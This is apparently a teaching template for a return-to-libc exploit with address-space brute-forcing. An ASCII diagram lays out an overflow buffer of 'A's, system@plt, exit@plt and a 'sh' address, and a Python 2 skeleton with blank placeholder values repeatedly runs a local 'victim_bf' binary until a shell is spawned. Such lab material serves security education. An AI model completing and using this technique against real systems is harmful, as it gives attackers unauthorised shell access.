'''
Attack Memory Model
Smaller    +  +-----------------+
Address    |  |                 |
           |  |     'A's        |
           |  |                 |
           |  +-----------------+
           |  |                 |
           |  |   system@plt    |
           |  |                 |
           |  +-----------------+
           |  |                 |
           |  |    exit@plt     |
           |  |                 |
           |  +-----------------+
           |  |                 |
           |  |   "sh"          |
 Bigger    |  |   address       |
 Address   v  +-----------------+

'''

from struct import pack
from subprocess import call

EXPERIMENTS = 256

'''
mid = ?
libc_base = ?
exit_offset = ?
system_offset = ?
sh_addr = ?
a_size = ?
pointer_fmt = ?


buf = "A" * a_size
buf += pack(pointer_fmt, libc_base + mid + system_offset)
buf += pack(pointer_fmt, libc_base + mid + exit_offset)
buf += pack(pointer_fmt, sh_addr)

# let's bet for EXPERIMENTS times
# that the base address of libc is libc_base + mid
i = 0
while (i < EXPERIMENTS):
    print "[EXPERIMENT] Round %d" % (i + 1)
    i += 1
    ret = call(["./victim_bf", buf])
    if (not ret):
        break
    else:
        print "[EXPERIMENT] Fail"
```
